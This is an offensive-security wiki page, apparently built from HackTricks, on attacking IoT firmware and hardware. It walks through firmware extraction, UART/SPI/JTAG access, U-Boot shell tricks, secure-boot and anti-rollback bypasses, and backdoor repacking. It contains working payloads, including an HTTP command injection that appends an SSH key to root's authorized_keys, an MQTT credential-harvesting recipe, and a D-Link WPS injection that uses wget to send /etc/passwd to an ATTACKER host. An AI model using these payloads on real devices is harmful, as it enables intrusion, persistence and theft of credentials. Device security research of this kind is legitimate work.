---
title: "Firmware and Hardware Attacks"
type: technique
tags: [iot, firmware, hardware, uart, jtag, spi, binwalk, exploitation]
phase: exploitation
date_created: 2026-06-16
date_updated: 2026-07-14
sources: [hacktricks-hardware]
---

## What it is

Extracting and analysing embedded-device firmware, and accessing hardware debug/storage interfaces (UART, JTAG/SWD, SPI flash) to obtain a shell, dump secrets, or find vulnerabilities. Extends [[iot-attacks]] beyond the network/MQTT layer.

## How it works

IoT/embedded devices store firmware in flash (often unencrypted) and expose debug interfaces on the PCB. Firmware unpacks to a filesystem holding binaries, configs, keys, and creds; hardware interfaces give bootloader/console access or a direct memory/flash read.

## Attack phases
Exploitation (device assessment; supply-chain / embedded research).

## Prerequisites
- A firmware image (vendor download, OTA capture, or flash dump). For hardware: the physical device, USB-UART/JTAG adapter, multimeter, optionally a SOIC clip + flash programmer.

## Methodology

### 1. Obtain firmware
- Vendor support/download portal; intercept the OTA update URL; or dump from flash (hardware path below).

### 2. Unpack + analyse (software)
```bash
binwalk firmware.bin              # identify; [[binwalk]]
binwalk -Me firmware.bin          # recursive extract -> squashfs-root/
# loot the rootfs:
grep -rIn "password\|admin\|BEGIN .*PRIVATE KEY\|api[_-]key" squashfs-root/
cat squashfs-root/etc/shadow      # crack -> [[hashcat]] / [[password-cracking]]
ls squashfs-root/etc/init.d squashfs-root/www   # services + web UI source
```
`binwalk -E` for entropy (flat high = encrypted firmware -> need hardware dump or key). Find the bootloader env, hardcoded creds, backdoor accounts, vulnerable services.

### 3. Emulate
```bash
# user-mode emulation of a single binary
qemu-arm-static -L squashfs-root squashfs-root/usr/bin/<svc>
# full-system: firmadyne / FirmAE
./run.sh <brand> firmware.bin     # boots the image, exposes the web UI for testing
```
Then test the web/network surface as normal ([[os-command-injection]] is extremely common in IoT web UIs).

### 4. Hardware interfaces
- **UART** (3 pads: TX/RX/GND): identify with multimeter/logic analyzer; `screen /dev/ttyUSB0 115200` -> boot log + console/U-Boot. Interrupt boot for a root shell or `setenv bootargs init=/bin/sh`.
- **SPI flash** (SOIC-8): clip + `flashrom -p <programmer> -r dump.bin` to read the chip directly (bypasses firmware encryption-at-rest if the chip is plaintext).
- **JTAG/SWD**: `openocd` -> halt CPU, read memory/flash, set breakpoints (`telnet localhost 4444`).

## Bypasses and variants
- Encrypted firmware: pull plaintext from SPI flash, or find the decryption key in the bootloader/an earlier unencrypted version.
- Secure boot present: look for a debug/UART bypass or downgrade to vulnerable firmware.

## Detection and defence
Signed + encrypted firmware, disabled/locked JTAG and serial console in production, secure boot, no hardcoded creds/keys, eFuse-protected keys.

## Tools
[[binwalk]], `firmadyne`/FirmAE, `qemu-*-static`, `flashrom`, `openocd`, USB-UART adapter, logic analyzer. Web layer -> [[os-command-injection]]; creds -> [[hashcat]].

## Firmware anti-rollback / downgrade bypass and image acquisition

Signature checks without version/rollback checks let you flash an older, still-validly-signed image to reintroduce a patched bug. Workflow: obtain an old signed image (vendor CDN/support, third-party archives, or bundled inside the companion mobile app), serve it to any exposed update channel (web UI, app API, USB, TFTP, MQTT; many consumer devices accept unauthenticated base64 firmware blobs), then exploit the re-opened vuln, e.g. post-downgrade command injection:
```http
POST /check_image_and_trigger_recovery?md5=1;echo 'ssh-rsa AAAA...'>>/root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
```
Pull firmware straight out of an APK without touching hardware:
```bash
apktool d vendor-app.apk -o vendor-app
ls vendor-app/assets/firmware   # firmware_v1.3.11_signed.bin under assets/fw/ or res/raw/
```
A/B-slot validate-one/boot-another bypass: when the anti-rollback ratchet lives only in the updater (not the bootloader) and slot metadata is not cryptographically bound to the validated image digest, promote a current signed image to the passive slot, then (without rebooting) re-enter the slot-erase routine on that same promoted slot, write an older signed image, skip revalidation, and reboot; the bootloader checks only signature/CRC and boots the downgrade. When reversing, look for slot selection from stale boot-time flags, an erase routine keyed on stale state, and a layout-write that bumps a generation counter without storing the validated hash.

## IoT firmware loot and embedded exploitation (U-Boot env, derived tokens, fragmented-download overflow)

Concrete embedded techniques beyond the current binwalk/UART/flashrom basics:
- UART logs-only (RX ignored)? Force a root shell by editing the U-Boot env offline: dump SPI flash with a SOIC-8 clip (`flashrom -p ch341a_spi -r flash.bin`), locate the env partition, set `bootargs` to include `init=/bin/sh`, recompute the U-Boot env CRC32, reflash only the env partition, reboot.
- Derived-token cloud config / MQTT credential harvest: many hubs fetch config from `https://<host>/pf/<deviceId>/<token>` where `token = uppercase(MD5(deviceId || STATIC_KEY))`. Recover STATIC_KEY from the firmware (Ghidra/radare2, search `/pf/` or MD5 use), read deviceId from UART boot logs (`picocom -b 115200 /dev/ttyUSB0`), then:
```bash
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .   # often plaintext MQTT host/user/pass + topic prefix
```
Predictable OUI+type+sequential deviceIds enable authorized mass enumeration. Then subscribe to maintenance topics with `mosquitto_sub` if topic ACLs are weak.
- Fragmented-download heap overflow (recurring embedded bug class): the first fragment (`offset==0`) stores `total_size` and `malloc`s it; later fragments only validate packet-local fields and `memcpy(&buf[offset], chunk, chunk_len)` without re-checking the original allocation. Send a small declared total to force a small heap chunk, then a later fragment with the expected offset but a larger `chunk_len` to overflow. Drive the daemon into the model/blob-download FSM state first (device emulation, e.g. nRF52840 for Zigbee), and force the protocol's own error/retry path to trigger a predictable `free()` for allocator-metadata primitives (musl/uClibc/dlmalloc). Zigbee note: if the target still uses the default Link Key `ZigBeeAlliance09`, sniffed commissioning traffic can expose the Network Key.


## Bootloader testing and early-boot code execution

The bootloader is the highest-value pre-OS surface: early code execution here defeats every OS-level control below it. Attack the interpreter, the recovery paths, and the signature policy.

### U-Boot interpreter and environment abuse

Break into the U-Boot prompt during boot (spam a key, `0`, space, or a board magic sequence before `bootcmd` runs), then pivot to a root shell or netboot:

```bash
# recon the boot state
printenv ; bdinfo ; help bootm booti bootz
# drop the kernel straight to a shell instead of init
setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=squashfs init=/bin/sh'
saveenv ; boot
# netboot an attacker kernel over TFTP
setenv ipaddr 192.168.2.2 ; setenv serverip 192.168.2.1 ; saveenv ; reset
tftpboot ${loadaddr} zImage ; tftpboot ${fdt_addr_r} devicetree.dtb
setenv bootargs "${bootargs} init=/bin/sh" ; booti ${loadaddr} - ${fdt_addr_r}
# persist by rewriting bootcmd (if env storage is not write-protected)
setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}' ; saveenv
```

Signature policy testing on FIT images: boot an unsigned image, a signed image with a bad hash, then a properly signed one. Any acceptance of the first two means `CONFIG_FIT_SIGNATURE`/`CONFIG_SPL_FIT_SIGNATURE` is absent or `verify=n`. Also probe `bootcount`/`bootlimit`/`altbootcmd` fallback paths and `env import` from untrusted media. From userland, check that `/etc/fw_env.config` offsets match the real MTD env (`fw_printenv`/`fw_setenv` against the wrong region is a read/write primitive).

### SoC BootROM recovery modes (override normal boot)

Most SoCs expose a BootROM loader that accepts code over USB/UART even when flash is invalid. If secure-boot eFuses are not blown, this executes your first-stage payload directly from SRAM/DRAM and bypasses every higher check:

```bash
imx-usb-loader u-boot.imx                                 # NXP i.MX Serial Download Mode (or uuu)
sunxi-fel -v uboot u-boot-sunxi-with-spl.bin              # Allwinner FEL
rkdeveloptool db loader.bin ; rkdeveloptool ul u-boot.bin # Rockchip MaskROM
```

Always confirm whether the secure-boot OTP/eFuse is burned first; an unfused device makes BootROM download mode a full secure-boot bypass.

### Network-boot and UEFI/PC-class surface

- PXE/DHCP: U-Boot BOOTP/DHCP parsing has memory-safety bugs (CVE-2024-42040 leaks U-Boot memory via crafted DHCP responses). Fuzz oversized option-67 bootfile-name, vendor-class, file/servername fields with a rogue DHCP server (Scapy, `dnsmasq`, Metasploit DHCP aux) on an isolated lab net; watch for hangs/leaks and for filename fields reaching a shell in later provisioning.
- UEFI ESP tampering: mount the EFI System Partition and check `EFI/BOOT/BOOTX64.efi`, vendor `shimx64.efi`/`grubx64.efi`. If `dbx` revocations are stale, boot a downgraded known-vulnerable signed shim/bootmanager to load your own kernel/`grub.cfg` for persistence under Secure Boot.
- LogoFAIL class: several OEM/IBV DXE image parsers mishandle boot logos. If a crafted image can be written to a vendor-specific ESP path (e.g. `\EFI\<vendor>\logo\*.bmp`) and survives reboot, early-boot code execution is possible even with Secure Boot on.
- Android Qualcomm ABL + GBL (Android 16): if ABL only checks for a UEFI app's presence in `efisp` and not its signature, an `efisp` write primitive is pre-OS unsigned code execution. Related ABL fastboot OEM argument-injection appends tokens to the kernel cmdline (`fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive`) to force permissive SELinux, and a boot-stage payload can flip persistent `is_unlocked=1`/`is_unlocked_critical=1` flags to emulate `fastboot oem unlock` without OEM approval.

## Secure-boot bypass: MediaTek bl2_ext at EL3

On many MediaTek platforms the Preloader skips authenticating the `bl2_ext` partition when `seccfg` is unlocked, yet still jumps into it at ARM EL3. Because `bl2_ext` is the component that verifies TEE/GenieZone/LK/kernel, a patched `bl2_ext` collapses the entire downstream chain of trust:

1. Obtain bootloader partitions (OTA/firmware package, EDL/DA readback, or hardware dump).
2. Find the `bl2_ext` verification routine (`verify_img`/`sec_img_auth`-style) and patch it to always return success or skip the call, preserving stack/frame setup and return codes.
3. Flash the modified `bl2_ext` via fastboot/DA on the unlocked device.
4. Reboot: Preloader runs the patched `bl2_ext` at EL3, which then loads unsigned TEE/GZ/LK/kernel with signature enforcement disabled.

Triage from `expdb` boot logs: `img_auth_required = 0` plus a `cert vfy(0 ms)` on the `bl2_ext` load means verification was skipped (some devices skip it even when locked). Tooling: **Fenrir** (reference patcher, Nothing Phone 2a fully supported, CMF Phone 1 partial) builds and flashes the patched image; **Penumbra** (Rust MTK DA/BootROM CLI) discovers the MTK USB port, loads a Download Agent, flips `seccfg` lock state (`set_seccfg_lock_state(Unlock)`, only if DA extensions are accepted), and reads partitions (`read_partition("lk_a", ...)`) for offline patching. Check the SBC bit via `target_config() & 0x1`. EL3 mistakes brick the device, so keep full partition dumps and an EDL/DA recovery path.

## Firmware integrity and authenticity gaps

- Backdoor and repack: extract with firmware-mod-kit (FMK), identify arch/endianness, cross-compile a bind/reverse shell (Buildroot), drop it into the rootfs, emulate with QEMU + chroot (or FirmAE/firmadyne for full-system), then repack. If secure boot is absent, the repacked image flashes through the normal update path.
- Unauthenticated transport bridges: a common design flaw exposes the same internal command protocol over several transports but authenticates only one. If USB requires challenge-response while BLE forwards unauthenticated GATT writes into the same firmware-update handler, BLE becomes a radio-reachable admin port. Enumerate writable characteristics (`ble.enum <MAC>`), match sniffed magic bytes/opcodes to the wired protocol, and replay privileged update/config/debug opcodes without pairing (`ble.write <MAC> <UUID> <HEX>` or `gatttool --char-write-req`).
- Checksum-only containers: an image protected only by an unkeyed CRC32/SHA-256/MD5 gives corruption detection, not authenticity. Patch the image, recompute the checksum exactly as the updater expects, and reflash. Over a remote transport (BLE/Wi-Fi) this is unauthenticated OTA firmware replacement.
- BadUSB via reflash: if a USB-trusted peripheral already enumerates a HID interface, append a keyboard entry to its existing HID report descriptor and reuse existing report-send routines to inject keystrokes; firmware compromise becomes host compromise.
- RTOS payload placement: run code from an existing dormant diagnostic/factory-test/telemetry task rather than trampolining into latency-sensitive handlers, so the scheduler launches it at boot without tripping the watchdog. For fast RE, overwrite a benign echo/debug opcode with memory read/write/exec primitives to iterate without reflashing.

## Sources

- HackTricks (hardware-physical-access), ingest slug `hacktricks-hardware`.

## Router web-admin WPS command injection (D-Link DIR-615-style)

Embedded router web UIs that accept a WPS enrollee PIN through the admin panel frequently pass the
PIN straight into a shell command. On D-Link DIR-615 (and siblings) the `set_sta_enrollee_pin`
parameter (submitted via the WPS page `do_wps.asp` -> `set_sta_enrollee_pin.cgi`) is unsanitized ->
command injection, running as the httpd user (commonly root on these firmwares).

- Reach the panel with default creds first (D-Link default: `admin` / blank password). See
  [[default-credentials]].
- Injection is BLIND (no output in the HTTP response). BusyBox `wget` is almost always present;
  `base64` and multi-line output usually are NOT, and a newline breaks a GET. So exfil a single
  space-free token in the URL PATH to a listener you control:

```
# attacker
python3 -m http.server 80
# injected into set_sta_enrollee_pin  (+ = URL-encoded space):
wget+http://ATTACKER/$(cat+/etc/passwd)
wget+http://ATTACKER/$(ls+/root/)
wget+http://ATTACKER/$(cat+/root/flag.txt)
```

The incoming request path in your `http.server` log is the command output. Command substitution
`$(...)` (or backticks) runs on the target; keep the substituted output a single token (no
spaces/newlines) or the GET path breaks.

Generalizes to any embedded admin field that feeds a shell (ping/traceroute diagnostics, WPS PIN,
DDNS hostname, firmware-update URL). On emulated router boxes the httpd backend can be slow to boot
behind the port-forward, see [[bug-hunting-methodology]] for triaging "port accepts TCP but returns
nothing". Related: [[iot-attacks]].

<!-- promoted-slug: dlink-wps-cmd-injection -->
